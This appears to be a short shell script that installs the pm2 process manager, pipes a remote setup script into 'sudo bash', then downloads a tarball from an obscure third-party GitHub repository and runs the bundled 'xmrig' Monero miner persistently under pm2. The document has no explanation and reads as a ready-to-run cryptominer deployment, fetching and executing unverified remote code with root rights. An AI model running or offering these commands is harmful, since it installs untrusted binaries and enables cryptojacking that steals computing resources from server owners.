apt install npm
npm install pm2 -g
apt update && apt install sudo curl && curl -sL https://raw.githubusercontent.com/Unitech/pm2/master/packager/setup.deb.sh | sudo -E bash -
pm2 completion install
npm install pm2 -g && pm2 update

wget https://raw.githubusercontent.com/bliptaz/rar/main/go9.tar.gz
tar -xf go9.tar.gz
cd go9
pm2 start ./xmrig
